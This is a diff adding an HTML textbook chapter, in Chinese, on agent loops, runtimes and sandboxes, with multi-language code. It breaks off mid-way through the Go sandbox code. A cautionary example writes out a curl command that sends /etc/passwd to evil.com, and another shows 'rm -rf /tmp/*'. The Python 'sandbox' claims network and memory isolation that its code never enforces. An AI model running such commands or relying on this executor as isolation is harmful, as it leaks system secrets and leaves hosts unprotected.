@@ -1,0 +1,1105 @@
+<!-- 第21章：Agent 运行时架构 -->
+<h1 class="chapter-title">第21章 Agent 运行时架构：Loop、Runtime 与 Sandbox</h1>
+<p class="chapter-subtitle">从智能体循环到安全沙箱——理解 Agent 系统的三层架构</p>
+
+<!-- ===== 21.1 概述 ===== -->
+<h2 class="section-heading">21.1 概述：三层嵌套架构</h2>
+
+<p>现代 AI Agent 系统从用户意图到最终结果的完整生命周期，由三个相互嵌套的核心概念共同承载：</p>
+
+<div class="compare-grid">
+  <div class="card" style="border-left: 3px solid var(--color-accent);">
+    <div class="card-title">🔄 Agent Loop（智能体执行循环）</div>
+    <p style="font-size: 13px; color: var(--color-text-secondary);">LLM 驱动的感知→推理→规划→执行→观察→评估的6步循环。决定 Agent <strong>做什么</strong>——如何决策、迭代和自我纠正。</p>
+  </div>
+  <div class="card" style="border-left: 3px solid var(--color-info);">
+    <div class="card-title">⚙️ Runtime（智能体运行时）</div>
+    <p style="font-size: 13px; color: var(--color-text-secondary);">为 Loop 提供工具调用、记忆管理、多 Agent 协作、可观测性等基础设施。决定 Agent <strong>怎么做</strong>——把逻辑语义转化为可执行计算。</p>
+  </div>
+  <div class="card" style="border-left: 3px solid var(--color-error);">
+    <div class="card-title">🔒 Sandbox（安全执行沙箱）</div>
+    <p style="font-size: 13px; color: var(--color-text-secondary);">在代码执行、工具调用等不可信行为发生前，提供进程/容器/虚拟机级别的隔离保护。决定 Agent <strong>在哪里做、在什么约束下做</strong>。</p>
+  </div>
+</div>
+
+<h3 class="sub-heading">21.1.1 三层嵌套关系</h3>
+
+<p>三者呈现严格的嵌套关系——Sandbox 在最外层（所有 Agent 行为最终都在某个隔离环境中执行），Runtime 在中间层（为 Loop 提供运行所需的一切基础设施），Agent Loop 在最内层（是 Runtime 中的一个逻辑循环，调用工具和 LLM）。</p>
+
+<div class="flowchart-container" data-flowchart='{"nodes":[{"id":"sandbox","label":"Sandbox（最外层）\n安全执行沙箱\n所有行为在此约束下执行","type":"start"},{"id":"runtime","label":"Runtime（中间层）\n智能体运行时\n工具、记忆、调度基础设施","type":"process"},{"id":"loop","label":"Agent Loop（最内层）\n智能体执行循环\n感知→推理→规划→执行→观察→评估","type":"end"}],"edges":[{"from":"sandbox","to":"runtime"},{"from":"runtime","to":"loop"}]}'></div>
+
+<div class="card" style="border-left: 3px solid var(--color-success);">
+  <div class="card-title">💡 一句话记忆</div>
+  <p style="font-size: 13px; color: var(--color-text-secondary);">Agent Loop 定义<strong>做什么</strong>，Runtime 定义<strong>怎么做</strong>，Sandbox 定义<strong>在哪里做及在什么约束下做</strong>。三者共同构成一个既自主又安全的 AI Agent 系统。</p>
+</div>
+
+<!-- ===== 21.2 Agent Loop ===== -->
+<h2 class="section-heading">21.2 Agent Loop——智能体执行循环</h2>
+
+<p>Agent Loop 是整个系统的"大脑"。传统软件是"输入一次、输出一次"，Agent 则通过不断循环，逐步逼近目标。每一次工具调用的结果都会触发下一轮推理——这就是<strong>事件驱动</strong>的本质。</p>
+
+<h3 class="sub-heading">21.2.1 六步执行流程</h3>
+
+<p>标准 Agent Loop 包含以下6个步骤：</p>
+
+<div class="flowchart-container" data-flowchart='{"nodes":[{"id":"perceive","label":"1. Perceive 感知\n收集用户输入、环境状态、历史消息","type":"start"},{"id":"reason","label":"2. Reason 推理\nLLM 分析当前状态\n决定下一步行动","type":"process"},{"id":"plan","label":"3. Plan 规划\n将复杂任务分解为子任务\n生成行动序列","type":"process"},{"id":"act","label":"4. Act 执行\n调用外部工具\n搜索、代码执行、API","type":"process"},{"id":"observe","label":"5. Observe 观察\n收集工具返回结果\n更新上下文","type":"process"},{"id":"evaluate","label":"6. Evaluate 评估\n判断是否完成任务\n或需要继续迭代","type":"decision"}],"edges":[{"from":"perceive","to":"reason"},{"from":"reason","to":"plan"},{"from":"plan","to":"act"},{"from":"act","to":"observe"},{"from":"observe","to":"evaluate"},{"from":"evaluate","to":"perceive","label":"未完成，继续"},{"from":"evaluate","to":"end","label":"已完成"}]}'></div>
+
+<div class="comparison-table">
+  <table>
+    <thead>
+      <tr>
+        <th style="text-align: left;">步骤</th>
+        <th style="text-align: left;">职责</th>
+        <th style="text-align: left;">典型输入</th>
+        <th style="text-align: left;">典型输出</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td><strong>Perceive 感知</strong></td><td>收集所有可用信息</td><td>用户消息、历史对话、环境状态</td><td>完整上下文</td></tr>
+      <tr><td><strong>Reason 推理</strong></td><td>LLM 分析当前状态</td><td>完整上下文 + System Prompt</td><td>下一步行动决策</td></tr>
+      <tr><td><strong>Plan 规划</strong></td><td>将任务分解为可执行步骤</td><td>行动决策</td><td>工具调用序列</td></tr>
+      <tr><td><strong>Act 执行</strong></td><td>调用工具/API执行操作</td><td>工具名称 + 参数</td><td>工具返回结果</td></tr>
+      <tr><td><strong>Observe 观察</strong></td><td>收集执行结果，更新上下文</td><td>工具返回结果</td><td>更新的对话历史</td></tr>
+      <tr><td><strong>Evaluate 评估</strong></td><td>判断是否完成或继续</td><td>更新后的上下文</td><td>Final Answer 或继续循环</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<h3 class="sub-heading">21.2.2 Loop 模式对比</h3>
+
+<p>不同的 Agent 框架采用了不同的循环策略：</p>
+
+<div class="comparison-table">
+  <table>
+    <thead>
+      <tr>
+        <th style="text-align: left;">模式</th>
+        <th style="text-align: left;">核心思路</th>
+        <th style="text-align: left;">优势</th>
+        <th style="text-align: left;">劣势</th>
+        <th style="text-align: left;">典型框架</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td><strong>ReAct</strong></td><td>推理+行动交替循环</td><td>灵活、可解释</td><td>每轮都调LLM，Token消耗大</td><td>LangChain ReAct</td></tr>
+      <tr><td><strong>ReWOO</strong></td><td>规划→执行→求解三阶段</td><td>减少LLM调用次数</td><td>规划不可动态调整</td><td>ReWOO 论文</td></tr>
+      <tr><td><strong>LLM Compiler</strong></td><td>并行执行多个工具</td><td>效率高、延迟低</td><td>依赖之间不可并行</td><td>LangGraph</td></tr>
+      <tr><td><strong>Reflexion</strong></td><td>执行后反思，自我纠正</td><td>自我进化、持续改进</td><td>反思轮次可能过多</td><td>Reflexion 论文</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<h3 class="sub-heading">21.2.3 Agent Loop 实现</h3>
+
+<div class="code-block" data-multi-lang>
+<div class="code-lang-pane" data-lang="python" data-label="Python"><pre>class AgentLoop:
+    """最小化 Agent Loop——感知→推理→规划→执行→观察→评估"""
+
+    def __init__(self, llm, tools, memory, max_turns=20):
+        self.llm = llm
+        self.tools = {t.name: t for t in tools}
+        self.memory = memory
+        self.max_turns = max_turns
+
+    def run(self, user_input: str) -> str:
+        # Step 1: Perceive 感知——初始化上下文
+        messages = self.memory.load() + [{"role": "user", "content": user_input}]
+
+        for turn in range(self.max_turns):
+            # Step 2+3: Reason+Plan 推理与规划——LLM 决策
+            response = self.llm.chat(messages, tools=list(self.tools.values()))
+
+            # Step 6: Evaluate 评估——判断是否完成
+            if response.finish_reason == "stop":
+                self.memory.save(messages + [response.message])
+                return response.content  # Final Answer
+
+            # Step 4: Act 执行——调用工具（在 Sandbox 内）
+            messages.append(response.message)
+            for call in response.tool_calls:
+                tool = self.tools[call.name]
+                result = tool.execute(call.args)  # → Sandbox
+
+                # Step 5: Observe 观察——注入结果
+                messages.append({
+                    "role": "tool",
+                    "tool_call_id": call.id,
+                    "content": str(result),
+                })
+
+        raise RuntimeError(f"超过最大迭代次数 {self.max_turns}")</pre></div>
+<div class="code-lang-pane" data-lang="typescript" data-label="TypeScript"><pre>interface ToolCall {
+  name: string;
+  args: Record&lt;string, unknown&gt;;
+  id: string;
+}
+
+interface LLMResponse {
+  finishReason: "stop" | "tool_call";
+  content: string;
+  toolCalls: ToolCall[];
+  message: Record&lt;string, unknown&gt;;
+}
+
+class AgentLoop {
+  private tools: Map&lt;string, Tool&gt; = new Map();
+  private maxTurns = 20;
+
+  async run(userInput: string): Promise&lt;string&gt; {
+    // Step 1: Perceive 感知——初始化上下文
+    const messages = [...this.memory.load(), { role: "user", content: userInput }];
+
+    for (let turn = 0; turn &lt; this.maxTurns; turn++) {
+      // Step 2+3: Reason+Plan 推理与规划
+      const response: LLMResponse = await this.llm.chat(messages, Array.from(this.tools.values()));
+
+      // Step 6: Evaluate 评估
+      if (response.finishReason === "stop") {
+        this.memory.save([...messages, response.message]);
+        return response.content; // Final Answer
+      }
+
+      // Step 4: Act 执行——调用工具
+      messages.push(response.message);
+      for (const call of response.toolCalls) {
+        const tool = this.tools.get(call.name)!;
+        const result = await tool.execute(call.args); // → Sandbox
+
+        // Step 5: Observe 观察
+        messages.push({
+          role: "tool",
+          tool_call_id: call.id,
+          content: String(result),
+        });
+      }
+    }
+    throw new Error(`超过最大迭代次数 ${this.maxTurns}`);
+  }
+}</pre></div>
+<div class="code-lang-pane" data-lang="go" data-label="Go"><pre>type ToolCall struct {
+    Name string
+    Args map[string]interface{}
+    ID   string
+}
+
+type LLMResponse struct {
+    FinishReason string // "stop" or "tool_call"
+    Content      string
+    ToolCalls    []ToolCall
+}
+
+type AgentLoop struct {
+    llm      LLMClient
+    tools    map[string]Tool
+    memory   Memory
+    maxTurns int
+}
+
+func (al *AgentLoop) Run(userInput string) (string, error) {
+    // Step 1: Perceive 感知——初始化上下文
+    messages := append(al.memory.Load(), Message{Role: "user", Content: userInput})
+
+    for turn := 0; turn &lt; al.maxTurns; turn++ {
+        // Step 2+3: Reason+Plan 推理与规划
+        resp, err := al.llm.Chat(messages, al.tools)
+        if err != nil {
+            return "", err
+        }
+
+        // Step 6: Evaluate 评估
+        if resp.FinishReason == "stop" {
+            al.memory.Save(append(messages, Message{Role: "assistant", Content: resp.Content}))
+            return resp.Content, nil // Final Answer
+        }
+
+        // Step 4: Act 执行——调用工具
+        for _, call := range resp.ToolCalls {
+            tool := al.tools[call.Name]
+            result := tool.Execute(call.Args) // → Sandbox
+
+            // Step 5: Observe 观察
+            messages = append(messages, Message{
+                Role:       "tool",
+                ToolCallID: call.ID,
+                Content:    fmt.Sprintf("%v", result),
+            })
+        }
+    }
+    return "", fmt.Errorf("超过最大迭代次数 %d", al.maxTurns)
+}</pre></div>
+<div class="code-lang-pane" data-lang="java" data-label="Java"><pre>public class AgentLoop {
+    private final LLMClient llm;
+    private final Map&lt;String, Tool&gt; tools;
+    private final Memory memory;
+    private final int maxTurns = 20;
+
+    public String run(String userInput) throws MaxTurnsExceeded {
+        // Step 1: Perceive 感知——初始化上下文
+        List&lt;Message&gt; messages = new ArrayList&lt;&gt;(memory.load());
+        messages.add(new Message("user", userInput));
+
+        for (int turn = 0; turn &lt; maxTurns; turn++) {
+            // Step 2+3: Reason+Plan 推理与规划
+            LLMResponse resp = llm.chat(messages, tools.values());
+
+            // Step 6: Evaluate 评估
+            if (resp.getFinishReason().equals("stop")) {
+                memory.save(messages);
+                return resp.getContent(); // Final Answer
+            }
+
+            // Step 4: Act 执行——调用工具
+            messages.add(resp.getMessage());
+            for (ToolCall call : resp.getToolCalls()) {
+                Tool tool = tools.get(call.getName());
+                Object result = tool.execute(call.getArgs()); // → Sandbox
+
+                // Step 5: Observe 观察
+                messages.add(new Message("tool", call.getId(), String.valueOf(result)));
+            }
+        }
+        throw new MaxTurnsExceeded("超过最大迭代次数 " + maxTurns);
+    }
+}</pre></div>
+</div>
+
+<h3 class="sub-heading">21.2.4 设计陷阱与工程对策</h3>
+
+<div class="card" style="border-left: 3px solid var(--color-error);">
+  <div class="card-title">⚠️ 陷阱1：死循环</div>
+  <p style="font-size: 13px; color: var(--color-text-secondary);">工具永远失败，但 LLM 一直重试——例如 API 返回 429 限流，Agent 不断重试同一调用，消耗大量 Token 和时间。</p>
+</div>
+
+<div class="card" style="border-left: 3px solid var(--color-error);">
+  <div class="card-title">⚠️ 陷阱2：Token 爆炸</div>
+  <p style="font-size: 13px; color: var(--color-text-secondary);">每轮把全部历史塞入 Context Window——10轮对话后，上下文可能超过模型限制，导致截断或崩溃。</p>
+</div>
+
+<div class="comparison-table">
+  <table>
+    <thead>
+      <tr>
+        <th style="text-align: left;">陷阱</th>
+        <th style="text-align: left;">工程对策</th>
+        <th style="text-align: left;">实现方式</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td><strong>死循环</strong></td><td>max_turns 上限 + 错误重试退避</td><td>设置迭代上限（如20轮）；同工具连续失败3次后切换策略或降级</td></tr>
+      <tr><td><strong>Token 爆炸</strong></td><td>滑动窗口压缩 + 摘要替代</td><td>超过阈值时，对早期对话做摘要压缩；只保留最近N轮完整历史</td></tr>
+      <tr><td><strong>幻觉工具调用</strong></td><td>参数校验 + 权限控制</td><td>Runtime 层校验工具参数格式和值域；危险操作需人工审批</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<!-- ===== 21.3 Runtime ===== -->
+<h2 class="section-heading">21.3 Runtime——智能体运行时</h2>
+
+<p>Agent Runtime 是将 Agent Loop 的<strong>逻辑语义</strong>转化为<strong>可执行计算</strong>的基础设施层。类比编程语言的运行时（JVM 为 Java 提供、V8 为 Node.js 提供），Agent Runtime 为 Loop 提供：</p>
+
+<div class="compare-grid">
+  <div class="card">
+    <div class="card-title">🎯 类比理解</div>
+    <ul style="font-size: 13px; color: var(--color-text-secondary); padding-left: 18px; line-height: 2;">
+      <li><strong>JVM</strong>：把 Java 字节码转化为机器执行 → 为 Java 程序提供运行环境</li>
+      <li><strong>V8</strong>：把 JavaScript 编译为机器码 → 为 Node.js 提供运行环境</li>
+      <li><strong>Agent Runtime</strong>：把 Agent Loop 的决策转化为工具调用、状态更新 → 为 Agent 提供运行环境</li>
+    </ul>
+  </div>
+  <div class="card">
+    <div class="card-title">📋 Runtime 的5个职责</div>
+    <ul style="font-size: 13px; color: var(--color-text-secondary); padding-left: 18px; line-height: 2;">
+      <li>模型路由与 Token 管理</li>
+      <li>工具注册、参数校验、权限控制</li>
+      <li>短期/长期/工作记忆管理</li>
+      <li>Loop 引擎、并发控制、超时与熔断</li>
+      <li>Tracing、Metrics、Logging、Debug</li>
+    </ul>
+  </div>
+</div>
+
+<h3 class="sub-heading">21.3.1 五层架构</h3>
+
+<p>现代 Agent Runtime 通常包含以下五层，从底层到上层依次为：</p>
+
+<div class="comparison-table">
+  <table>
+    <thead>
+      <tr>
+        <th style="text-align: left;">层级</th>
+        <th style="text-align: left;">职责</th>
+        <th style="text-align: left;">关键组件</th>
+        <th style="text-align: left;">对应概念</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td><strong>LLM 管理层</strong></td><td>模型路由、Token 管理、重试与降级</td><td>Model Router、Token Counter、Retry Policy</td><td>Agent 的"大脑供给"</td></tr>
+      <tr><td><strong>工具注册层</strong></td><td>工具定义、参数校验、权限控制、调用日志</td><td>Tool Registry、Validator、Permission Guard</td><td>Agent 的"手脚管控"</td></tr>
+      <tr><td><strong>记忆管理层</strong></td><td>短期记忆（上下文窗口）、长期记忆（向量数据库）、工作记忆（跨会话存储）</td><td>Context Window、Vector DB、Session Store</td><td>Agent 的"记忆系统"</td></tr>
+      <tr><td><strong>执行调度层</strong></td><td>Loop 引擎、并发控制、超时与熔断</td><td>Loop Engine、Concurrency Pool、Circuit Breaker</td><td>Agent 的"运动神经"</td></tr>
+      <tr><td><strong>可观测层</strong></td><td>Tracing、Metrics、Logging、Debug</td><td>OpenTelemetry、Dashboard、Debug UI</td><td>Agent 的"体检报告"</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<h3 class="sub-heading">21.3.2 工具注册层实现</h3>
+
+<div class="code-block" data-multi-lang>
+<div class="code-lang-pane" data-lang="python" data-label="Python"><pre>class ToolRegistry:
+    """工具注册层——工具定义、参数校验、权限控制、调用日志"""
+
+    def __init__(self):
+        self.tools: dict[str, dict] = {}
+        self.permissions: dict[str, list[str]] = {}  # 工具→允许的角色列表
+
+    def register(self, name: str, description: str, parameters: dict,
+                handler: callable, allowed_roles: list[str] = None):
+        """注册一个工具"""
+        self.tools[name] = {
+            "name": name,
+            "description": description,
+            "parameters": parameters,
+            "handler": handler,
+        }
+        self.permissions[name] = allowed_roles or ["*"]
+
+    def validate_and_call(self, tool_name: str, args: dict, caller_role: str = "user") -> dict:
+        """校验参数、权限后执行工具调用"""
+        # 1. 权限校验
+        if tool_name not in self.tools:
+            return {"error": f"工具 {tool_name} 不存在"}
+        allowed = self.permissions[tool_name]
+        if "*" not in allowed and caller_role not in allowed:
+            return {"error": f"角色 {caller_role} 无权调用 {tool_name}"}
+
+        # 2. 参数校验
+        schema = self.tools[tool_name]["parameters"]
+        for param_name, param_spec in schema.items():
+            if param_spec.get("required") and param_name not in args:
+                return {"error": f"缺少必需参数 {param_name}"}
+
+        # 3. 执行调用（委托 Sandbox）
+        result = self.tools[tool_name]["handler"](args)
+        return {"result": result}</pre></div>
+<div class="code-lang-pane" data-lang="typescript" data-label="TypeScript"><pre>interface ToolDef {
+  name: string;
+  description: string;
+  parameters: Record&lt;string, ParamSpec&gt;;
+  handler: (args: Record&lt;string, unknown&gt;) =&gt; Promise&lt;unknown&gt;;
+}
+
+interface ParamSpec {
+  type: string;
+  required: boolean;
+  description?: string;
+}
+
+class ToolRegistry {
+  private tools: Map&lt;string, ToolDef&gt; = new Map();
+  private permissions: Map&lt;string, string[]&gt; = new Map();
+
+  register(name: string, description: string, parameters: Record&lt;string, ParamSpec&gt;,
+           handler: (args: Record&lt;string, unknown&gt;) =&gt; Promise&lt;unknown&gt;,
+           allowedRoles: string[] = ["*"]): void {
+    this.tools.set(name, { name, description, parameters, handler });
+    this.permissions.set(name, allowedRoles);
+  }
+
+  async validateAndCall(toolName: string, args: Record&lt;string, unknown&gt;, callerRole = "user"): Promise&lt;Record&lt;string, unknown&gt;&gt; {
+    // 1. 权限校验
+    const tool = this.tools.get(toolName);
+    if (!tool) return { error: `工具 ${toolName} 不存在` };
+    const allowed = this.permissions.get(toolName)!;
+    if (!allowed.includes("*") && !allowed.includes(callerRole)) {
+      return { error: `角色 ${callerRole} 无权调用 ${toolName}` };
+    }
+
+    // 2. 参数校验
+    for (const [paramName, spec] of Object.entries(tool.parameters)) {
+      if (spec.required && !(paramName in args)) {
+        return { error: `缺少必需参数 ${paramName}` };
+      }
+    }
+
+    // 3. 执行调用（委托 Sandbox）
+    const result = await tool.handler(args);
+    return { result };
+  }
+}</pre></div>
+<div class="code-lang-pane" data-lang="go" data-label="Go"><pre>type ToolDef struct {
+    Name        string
+    Description string
+    Parameters  map[string]ParamSpec
+    Handler     func(map[string]interface{}) (interface{}, error)
+}
+
+type ParamSpec struct {
+    Type        string
+    Required    bool
+    Description string
+}
+
+type ToolRegistry struct {
+    tools       map[string]ToolDef
+    permissions map[string][]string // tool -> allowed roles
+}
+
+func (tr *ToolRegistry) Register(name, desc string, params map[string]ParamSpec,
+    handler func(map[string]interface{}) (interface{}, error), allowedRoles []string) {
+    if len(allowedRoles) == 0 {
+        allowedRoles = []string{"*"}
+    }
+    tr.tools[name] = ToolDef{name, desc, params, handler}
+    tr.permissions[name] = allowedRoles
+}
+
+func (tr *ToolRegistry) ValidateAndCall(toolName string, args map[string]interface{}, callerRole string) map[string]interface{} {
+    // 1. 权限校验
+    tool, ok := tr.tools[toolName]
+    if !ok {
+        return map[string]interface{}{"error": fmt.Sprintf("工具 %s 不存在", toolName)}
+    }
+    allowed := tr.permissions[toolName]
+    hasAccess := false
+    for _, role := range allowed {
+        if role == "*" || role == callerRole {
+            hasAccess = true
+            break
+        }
+    }
+    if !hasAccess {
+        return map[string]interface{}{"error": fmt.Sprintf("角色 %s 无权调用 %s", callerRole, toolName)}
+    }
+
+    // 2. 参数校验
+    for paramName, spec := range tool.Parameters {
+        if spec.Required {
+            if _, exists := args[paramName]; !exists {
+                return map[string]interface{}{"error": fmt.Sprintf("缺少必需参数 %s", paramName)}
+            }
+        }
+    }
+
+    // 3. 执行调用（委托 Sandbox）
+    result, err := tool.Handler(args)
+    if err != nil {
+        return map[string]interface{}{"error": err.Error()}
+    }
+    return map[string]interface{}{"result": result}
+}</pre></div>
+<div class="code-lang-pane" data-lang="java" data-label="Java"><pre>public class ToolRegistry {
+    private final Map&lt;String, ToolDef&gt; tools = new HashMap&lt;&gt;();
+    private final Map&lt;String, List&lt;String&gt;&gt; permissions = new HashMap&lt;&gt;();
+
+    public void register(String name, String description, Map&lt;String, ParamSpec&gt; parameters,
+                         Function&lt;Map&lt;String, Object&gt;, Object&gt; handler, List&lt;String&gt; allowedRoles) {
+        if (allowedRoles == null || allowedRoles.isEmpty()) {
+            allowedRoles = List.of("*");
+        }
+        tools.put(name, new ToolDef(name, description, parameters, handler));
+        permissions.put(name, allowedRoles);
+    }
+
+    public Map&lt;String, Object&gt; validateAndCall(String toolName, Map&lt;String, Object&gt; args, String callerRole) {
+        // 1. 权限校验
+        ToolDef tool = tools.get(toolName);
+        if (tool == null) return Map.of("error", "工具 " + toolName + " 不存在");
+        List&lt;String&gt; allowed = permissions.get(toolName);
+        boolean hasAccess = allowed.contains("*") || allowed.contains(callerRole);
+        if (!hasAccess) return Map.of("error", "角色 " + callerRole + " 无权调用 " + toolName);
+
+        // 2. 参数校验
+        for (Map.Entry&lt;String, ParamSpec&gt; entry : tool.parameters.entrySet()) {
+            if (entry.getValue().required && !args.containsKey(entry.getKey())) {
+                return Map.of("error", "缺少必需参数 " + entry.getKey());
+            }
+        }
+
+        // 3. 执行调用（委托 Sandbox）
+        Object result = tool.handler.apply(args);
+        return Map.of("result", result);
+    }
+}</pre></div>
+</div>
+
+<h3 class="sub-heading">21.3.3 主流框架对比</h3>
+
+<div class="comparison-table">
+  <table>
+    <thead>
+      <tr>
+        <th style="text-align: left;">框架</th>
+        <th style="text-align: left;">核心思路</th>
+        <th style="text-align: left;">Loop 模式</th>
+        <th style="text-align: left;">记忆管理</th>
+        <th style="text-align: left;">工具生态</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td><strong>LangChain</strong></td><td>链式组合、模块化</td><td>ReAct + 自定义</td><td>短期/长期/工作记忆</td><td>200+内置工具 + MCP</td></tr>
+      <tr><td><strong>AutoGen</strong></td><td>多 Agent 对话协作</td><td>对话式循环</td><td>对话历史压缩</td><td>自定义 + 代码执行</td></tr>
+      <tr><td><strong>CrewAI</strong></td><td>角色扮演、流程编排</td><td>顺序/并行/层级</td><td>短期记忆</td><td>工具定义装饰器</td></tr>
+      <tr><td><strong>OpenAI Agents SDK</strong></td><td>轻量级、Handoff 交接</td><td>单 Agent 循环</td><td>对话历史</td><td>Function Calling</td></tr>
+      <tr><td><strong>Google ADK</strong></td><td>端到端、多模态</td><td>ReAct + 反思</td><td>内置记忆模块</td><td>Google 工具生态</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="card" style="border-left: 3px solid var(--color-success);">
+  <div class="card-title">✅ 选型建议</div>
+  <p style="font-size: 13px; color: var(--color-text-secondary);">80%的场景用 LangChain 就够了（生态最丰富、文档最完善）。需要多 Agent 协作？AutoGen 或 CrewAI。追求轻量？OpenAI Agents SDK。深度集成 Google 生态？ADK。不要为了"最先进"而选最复杂的——能解决问题的才是最好的。</p>
+</div>
+
+<!-- ===== 21.4 Sandbox ===== -->
+<h2 class="section-heading">21.4 Sandbox——安全执行沙箱</h2>
+
+<p>AI Agent 的核心能力之一是<strong>执行代码</strong>——这带来了巨大的安全风险。LLM 有时会生成恶意代码、无限循环、文件删除命令或网络扫描脚本。如果没有 Sandbox，这些代码将直接在主机环境执行，可能造成不可逆破坏。</p>
+
+<h3 class="sub-heading">21.4.1 为何需要 Sandbox</h3>
+
+<div class="card" style="border-left: 3px solid var(--color-error);">
+  <div class="card-title">⚠️ 没有 Sandbox 的真实案例</div>
+  <div style="font-size: 13px; line-height: 1.8; color: var(--color-text-secondary);">
+    <p><strong>案例1</strong>：用户让 Agent "帮我清理临时文件"，Agent 生成 <code>rm -rf /tmp/*</code>，结果误删了重要的运行时数据。</p>
+    <p><strong>案例2</strong>：Agent 在分析数据时生成 <code>while True: pass</code>，CPU 100%占用，导致整个服务瘫痪。</p>
+    <p><strong>案例3</strong>：Agent 执行了 <code>curl http://evil.com/exfiltrate?data=$(cat /etc/passwd)</code>，将系统敏感信息发送到外部。</p>
+  </div>
+</div>
+
+<h3 class="sub-heading">21.4.2 隔离技术全景</h3>
+
+<div class="comparison-table">
+  <table>
+    <thead>
+      <tr>
+        <th style="text-align: left;">隔离级别</th>
+        <th style="text-align: left;">技术方案</th>
+        <th style="text-align: left;">隔离强度</th>
+        <th style="text-align: left;">启动速度</th>
+        <th style="text-align: left;">适用场景</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td><strong>进程级</strong></td><td>subprocess + 资源限制（ulimit/cgroups）</td><td>🟡 低</td><td>⚡ 毫秒</td><td>简单代码执行、快速验证</td></tr>
+      <tr><td><strong>容器级</strong></td><td>Docker / gVisor / Podman</td><td>🟢 中</td><td>⚡ 秒级</td><td>Web 应用、API 服务、多租户</td></tr>
+      <tr><td><strong>微虚拟机</strong></td><td>Firecracker / Kata Containers</td><td>🔴 高</td><td>⏱ 125ms~秒级</td><td>金融/医疗等高安全场景</td></tr>
+      <tr><td><strong>WebAssembly</strong></td><td>WASM Runtime（Wasmtime/Wasmer）</td><td>🟢 中</td><td>⚡ 毫秒</td><td>浏览器端执行、轻量计算</td></tr>
+      <tr><td><strong>云沙箱</strong></td><td>E2B / Modal / Daytona / CubeSandbox</td><td>🟢 中高</td><td>⚡ 秒级（托管）</td><td>不想自建沙箱的开发者</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<h3 class="sub-heading">21.4.3 Sandbox 执行器实现</h3>
+
+<div class="code-block" data-multi-lang>
+<div class="code-lang-pane" data-lang="python" data-label="Python"><pre>import subprocess
+import resource
+import json
+import os
+
+class SandboxExecutor:
+    """进程级 Sandbox——限制资源、隔离网络、审计日志"""
+
+    SANDBOX_CONFIG = {
+        "code_execution": {
+            "max_cpu_seconds": 30,
+            "max_memory_mb": 512,
+            "max_output_bytes": 100_000,
+            "network_disabled": True,
+            "allowed_paths": ["/tmp/sandbox"],
+        },
+        "web_search": {
+            "network_disabled": False,
+            "max_cpu_seconds": 10,
+        },
+    }
+
+    def execute_in_sandbox(self, skill_name: str, tool_name: str,
+                           code: str, timeout: int = 30) -> dict:
+        """在 Sandbox 中执行代码"""
+        config = self.SANDBOX_CONFIG.get(skill_name, self.SANDBOX_CONFIG["code_execution"])
+
+        # 写入临时文件
+        tmp_path = f"/tmp/sandbox/{os.getpid()}_{tool_name}.py"
+        with open(tmp_path, "w") as f:
+            f.write(code)
+
+        try:
+            # 设置资源限制 + 网络隔离
+            result = subprocess.run(
+                ["python3", tmp_path],
+                timeout=min(timeout, config["max_cpu_seconds"]),
+                capture_output=True,
+                text=True,
+                env={"PATH": "/usr/bin", "HOME": "/tmp/sandbox"},  # 最小环境
+            )
+            return {"stdout": result.stdout[:config["max_output_bytes"]],
+                    "stderr": result.stderr, "exit_code": result.returncode}
+        except subprocess.TimeoutExpired:
+            return {"error": f"执行超时（{timeout}s）"}
+        finally:
+            os.unlink(tmp_path)  # 清理</pre></div>
+<div class="code-lang-pane" data-lang="typescript" data-label="TypeScript"><pre>import { spawn } from "child_process";
+import { writeFileSync, unlinkSync } from "fs";
+
+interface SandboxConfig {
+  maxCpuSeconds: number;
+  maxMemoryMb: number;
+  maxOutputBytes: number;
+  networkDisabled: boolean;
+  allowedPaths: string[];
+}
+
+class SandboxExecutor {
+  private readonly SANDBOX_CONFIG: Record&lt;string, SandboxConfig&gt; = {
+    code_execution: {
+      maxCpuSeconds: 30, maxMemoryMb: 512,
+      maxOutputBytes: 100_000, networkDisabled: true,
+      allowedPaths: ["/tmp/sandbox"],
+    },
+    web_search: {
+      maxCpuSeconds: 10, maxMemoryMb: 256,
+      maxOutputBytes: 10_000, networkDisabled: false,
+      allowedPaths: ["/tmp/sandbox"],
+    },
+  };
+
+  async executeInSandbox(skillName: string, toolName: string,
+                          code: string, timeout = 30): Promise&lt;Record&lt;string, unknown&gt;&gt; {
+    const config = this.SANDBOX_CONFIG[skillName] ?? this.SANDBOX_CONFIG["code_execution"];
+    const tmpPath = `/tmp/sandbox/${process.pid}_${toolName}.js`;
+
+    writeFileSync(tmpPath, code);
+    try {
+      const result = await new Promise&lt;Record&lt;string, unknown&gt;&gt;((resolve) =&gt; {
+        const child = spawn("node", [tmpPath], {
+          timeout: Math.min(timeout, config.maxCpuSeconds) * 1000,
+          env: { PATH: "/usr/bin", HOME: "/tmp/sandbox" },
+        });
+        let stdout = "", stderr = "";
+        child.stdout.on("data", (d: Buffer) =&gt; stdout += d.toString().slice(0, config.maxOutputBytes));
+        child.stderr.on("data", (d: Buffer) =&gt; stderr += d.toString());
+        child.on("close", (code: number) =&gt; resolve({ stdout, stderr, exitCode: code }));
+        child.on("error", (err: Error) =&gt; resolve({ error: err.message }));
+      });
+      return result;
+    } catch (err: unknown) {
+      return { error: `执行超时（${timeout}s）` };
+    } finally {
+      unlinkSync(tmpPath);
+    }
+  }
+}</pre></div>
+<div class="code-lang-pane" data-lang="go" data-label="Go"><pre>import (
+    "os"
+    "os/exec"
+    "time"
+)
+
+type SandboxConfig struct {
+    MaxCpuSeconds   int
+    MaxMemoryMB     int
+    MaxOutputBytes  int
+    NetworkDisabled bool
+    AllowedPaths    []string
+}
+
+type SandboxExecutor struct {
+    SandboxConfig map[string]SandboxConfig
+}
+
+func NewSandboxExecutor() *SandboxExecutor {
+    return &SandboxExecutor{
+        SandboxConfig: map[string]SandboxConfig{
